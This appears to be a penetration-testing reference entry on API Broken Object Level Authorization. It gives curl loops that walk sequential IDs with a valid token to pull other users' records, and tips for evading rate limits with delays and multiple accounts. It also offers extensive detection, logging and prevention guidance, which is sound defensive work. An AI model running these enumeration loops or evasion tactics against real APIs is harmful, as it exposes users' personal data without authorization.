name: API BOLA – Sequential Object ID Enumeration
command: for ((i=1; i<=20; i++)); do curl -s -w "\n" -X GET "http://<target>/api/v1/<endpoint>/$i" -H "accept: application/json" -H "Authorization: Bearer <jwt_token>" | jq; done
description: Exploit Broken Object Level Authorization (BOLA / OWASP API1) by iterating sequential numeric IDs against an API endpoint. Each request uses your own valid JWT but accesses other users' objects. Responses containing other users' data confirm BOLA.
notes: BOLA is OWASP API Security Top 10 #1. The API trusts the client-supplied ID without verifying ownership. Use jq to pretty-print JSON responses and spot data leakage. Extend the loop range based on observed IDs (check your own object's ID first). UUIDs are harder to enumerate — try predictable patterns or IDOR chaining first. Always authenticate first (POST /api/v1/authentication/sign-in) to get a valid JWT before running the loop.

steps.caption: Step 1: Authenticate and capture JWT token from response
Step 2: Get your own object ID to understand ID format

steps.command: for ((i=1; i<=20; i++)); do curl -s -w "\n" -X GET "http://<target>/api/v1/<endpoint>/$i" -H "Authorization: Bearer <jwt_token>" | jq; done
steps.caption: Step 3: Enumerate all object IDs — responses with other users' data = BOLA confirmed

variations.command: for i in $(seq 1 100); do curl -s -X GET "http://<target>/api/v1/<endpoint>/$i" -H "Authorization: Bearer <jwt_token>" | jq '.id,.email,.name' 2>/dev/null; done
variations.caption: Larger range — extract only key fields with jq
variations.label: Loop IDs 1-100 (users)

variations.caption: Enumerate report endpoint — extract specific field per object
variations.label: Loop IDs 1-20 (reports)

When ID enumeration fails, try credential attacks on the auth endpoint

defense.why_it_works: Broken Object Level Authorization (OWASP API1 / BOLA) occurs when an API accepts a user-supplied object identifier and returns the corresponding resource without verifying that the authenticated user actually owns or has permission to access it. Sequential numeric IDs make enumeration trivial — an attacker with any valid session can walk from ID 1 to 1000000 and harvest every user's data.
defense.prerequisites: Any valid API credential (JWT, API key, session cookie). API endpoint that accepts an object ID as a URL path parameter or query string. Sequential or predictable IDs (numeric, UUID v1, or ULID). No rate-limiting or ID-based access control enforced server-side.
defense.impact: T1078 Valid Accounts (IDOR giving access to other accounts) + T1087 Account Discovery. Full horizontal privilege escalation: authenticated user accesses every other user's records. In worst case exposes PII, financial data, private messages, or account credentials across the entire user base.
defense.detection:
Monitor for unusual access patterns: a single authenticated token accessing many different user IDs in rapid succession. SIEM rule: auth_user=X AND resource_owner_id != X AND count > threshold in 60s. API gateway (Kong, AWS API GW, Apigee) request logs with user-to-resource mapping. WAF anomaly detection on sequential ID patterns. Business logic monitoring: flag accounts whose requests span > N distinct user IDs per session.
Anomalous logon patterns, abnormal logon types, and inconsistent geographic or time-based activity across Windows endpoints (DET0560/AN1543).
SSH logins, sudo/su abuse, and service account anomalies outside expected patterns (AN1544).
Interactive and remote logins by service accounts or users at unusual times with unexpected child process activity (AN1545).
IdP logs showing geographic anomalies, impossible travel, risky sign-ins, multiple MFA attempts or failures (AN1546).
defense.artifacts: API gateway logs showing single-token sequential GET /api/users/{1..1000} | SIEM alert: cross-user resource access | Application error logs if IDs not found (404 pattern mixed with 200s) | Network flows: high volume GET requests to same endpoint with incrementing path parameters
defense.prevention:
Server-side ownership checks on every API request — never trust the client-supplied ID alone. Use indirect references (map session → allowed IDs server-side; client never sees real DB IDs). Implement authorization middleware that checks object ownership before returning data. Use UUIDs instead of sequential integers (slows but doesn't prevent BOLA). Rate-limit per token per endpoint. Log and alert on cross-user access patterns. Follow OWASP API Security Top 10 — API1:2023.
Account Use Policies: Use conditional access policies to block logins from non-compliant devices or outside defined IP ranges.
Active Directory Configuration: Disable legacy authentication; require modern authentication protocols with MFA support.
Multi-factor Authentication: Implement MFA across all account types (default, local, domain, cloud accounts).
Password Policies: Change default credentials immediately after installation; minimize password reuse across accounts.
defense.evasion: Use slow enumeration with random delays to avoid rate-limiting triggers. Interleave with legitimate requests to own resources. Use different JWT tokens (e.g., from multiple created accounts) to distribute the enumeration and avoid per-token rate limits.
defense.misconfiguration: Authorization check only verifies token validity, not ownership. Server fetches object by ID without joining to authenticated user: SELECT * FROM orders WHERE id = ? (missing AND user_id = current_user_id). UUID v1 chosen over UUID v4 — UUIDs v1 embed timestamp and MAC address, making them predictable.
